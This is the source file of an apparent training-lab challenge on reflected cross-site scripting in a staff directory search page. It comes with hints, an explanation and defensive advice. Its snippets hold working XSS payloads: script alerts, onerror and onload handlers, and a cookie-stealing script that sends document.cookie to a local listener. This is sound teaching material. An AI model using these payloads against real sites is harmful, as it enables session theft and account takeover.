"""web-xss: reflected cross-site scripting in a search page.

The staff directory search echoes the search term into the page without
escaping it. Markup in the term becomes part of the page, so a <script> (or an
event handler such as onerror=) runs in the browser of whoever opens the link.

The target parses the echoed term the way a browser would. When it would run
script, the page shows the flag, so the lab can be solved in Firefox (where
the script really runs) or with curl.
"""

from __future__ import annotations

from typing import List, Tuple
from urllib.parse import quote

from cyberlab import targets
from cyberlab.challenges import Challenge, register
from cyberlab.workspace import Workspace

STEAL = "<script>new Image().src='http://127.0.0.1:9001/?c='+document.cookie</script>"


class WebXss(Challenge):
    def setup(self, ws: Workspace) -> str:
        port = targets.start(ws, "webapp")
        return (f"Target: http://127.0.0.1:{port}/search\n"
                "Search for something and look at where your words end up in the page.")

    def snippets(self, ws: Workspace) -> List[Tuple[str, str]]:
        url = f"http://127.0.0.1:{targets.port_of(ws, 'webapp')}"
        cookie = quote("<script>alert(document.cookie)</script>", safe="")
        return [
            ("The classic test, typed into the search box",
             "<script>alert(1)</script>"),
            ("The same thing from a terminal (curl encodes the term for you)",
             f"curl -s -G {url}/search --data-urlencode 'q=<script>alert(1)</script>'"),
            ("What an attacker is after: open this in Firefox and the page shows its own "
             "session cookie",
             f"{url}/search?q={cookie}"),
            ("When a filter strips <script>, event handlers still run",
             "<img src=x onerror=alert(document.domain)>\n<svg onload=alert(1)>"),
            ("Stealing it, kept inside the lab: listen in one terminal, then open the link "
             "in Firefox and watch the cookie arrive",
             f"nc -l 9001\n{url}/search?q={quote(STEAL, safe='')}"),
            ("The fixed search (escaped output): the same payload is shown as text",
             f"curl -s -G {url}/secure/search --data-urlencode 'q=<script>alert(1)</script>'"),
        ]


register(WebXss(
    id="web-xss",
    title="Cross-site scripting: run script in the search page",
    track="web",
    difficulty="easy",
    goal=("The staff directory search shows your search term back to you. Get the page "
          "to run JavaScript of yours, for example an alert box. When it would run in a "
          "visitor's browser, the page shows a flag."),
    hints=[
        "Search for <b>hello</b>. Is the word bold? View the page source (Ctrl+U) and find "
        "your search term: is it text, or did it become HTML?",
        "If your tags become part of the page, so does a script tag. What does the browser "
        "do with <script>...</script> when it finds one in a page?",
        "Search for:  <script>alert(1)</script>",
    ],
    tools=["Firefox", "curl"],
    learned=("The page put your search term into its HTML without escaping it, so the "
             "browser couldn't tell your markup from the site's own. Your <script> ran as "
             "part of the Northwind site. It's called reflected XSS because the payload "
             "travels in the request (here the ?q= in the URL) and is reflected straight back."),
    real_world=("The script runs in the victim's browser, as the site, with the victim "
                "logged in. It can read the page, take the session cookie and send it away, "
                "or act as the user: change an email address, post a message, move money. "
                "The attacker never breaks into the server. They send a link, and the trusted "
                "site delivers the attack for them."),
    defend=[
        "Escape output for where it lands: in HTML, < > & and quotes become &lt; &gt; &amp; "
        "&quot;. Template engines (Jinja2, React) do it by default; the bug is turning it off.",
        "Mark session cookies HttpOnly so script can't read them. It limits the damage; it "
        "doesn't fix the hole.",
        "Send a Content-Security-Policy header that forbids inline script.",
        "Filtering out the word 'script' doesn't work: there are dozens of other ways in.",
    ],
))
